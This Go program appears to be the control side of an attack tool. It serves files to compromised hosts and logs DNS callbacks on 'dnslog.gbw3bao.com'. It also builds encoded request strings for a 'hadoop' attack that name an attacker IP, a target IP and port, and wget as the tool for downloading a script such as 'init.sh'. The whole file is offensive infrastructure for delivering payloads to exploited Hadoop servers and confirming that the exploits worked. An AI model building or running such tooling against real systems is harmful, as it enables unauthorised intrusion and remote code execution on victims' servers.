package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/sbot/server"
	"os"
)


func getReq(fname string) (freq string,dreq string) {

	/*
	Fname:        argsMap["fname"],
		AttackType:   argsMap["atype"],
			AttackIP:     argsMap["pip"],
			TargetIP:     argsMap["tip"],
			TargetPort:   int(port),
			TargetOutIP:  r.RemoteAddr,
			DownloadTool: argsMap["dt"],
	*/

	freqs := fmt.Sprintf("fname=%s&atype=hadoop&pip=192.168.1.151&tip=192.168.1.152&tPort=8081&dt=wget",fname)
	dreqs := "atype=hadoop&pip=192.168.1.151&tip=192.168.1.152&tPort=8081"

	bfreqs := base64.StdEncoding.EncodeToString([]byte(freqs))
	bdreqs := base64.StdEncoding.EncodeToString([]byte(dreqs))

	return hex.EncodeToString([]byte(bfreqs)),hex.EncodeToString([]byte(bdreqs))
}


func main(){


	fmt.Println(getReq(os.Args[2]))

	cfg := &server.FileServerConfig{
		RootDir: os.Args[1],
		Host:    "0.0.0.0",
		Port:    8080,
	}

	dnsCfg := &server.DNSServerConfig{SubDomain:"dnslog.gbw3bao.com",DefaultIP:"127.0.0.1"}

	f := server.NewFileServer(cfg)
	d := server.NewDNSServer(dnsCfg)

	go f.Start()
	go d.Start()

	fsub := f.NewFileDownloadRequestSub()
	dsub := d.NewDNSRequestSub()

	for {

		select {

		case fr := <- fsub.Sub():

			data,_:= json.Marshal(fr)

			fmt.Println(string(data))

		case dr := <- dsub.Sub():
			data,_:= json.Marshal(dr)
			fmt.Println(string(data))

		}

	}

	//fmt.Println(getReq("init.sh"))
}

